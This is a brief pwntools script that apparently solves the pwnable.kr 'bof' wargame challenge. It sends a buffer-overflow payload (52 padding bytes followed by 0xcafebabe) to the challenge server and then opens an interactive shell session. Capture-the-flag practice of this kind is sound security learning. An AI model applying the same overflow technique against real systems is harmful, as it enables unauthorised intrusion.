#!/usr/bin/ipython
from pwn import *

payload = "A"*52 + p32(0xcafebabe)

r = remote("pwnable.kr", 9000)

r.sendline(payload)

r.interactive()


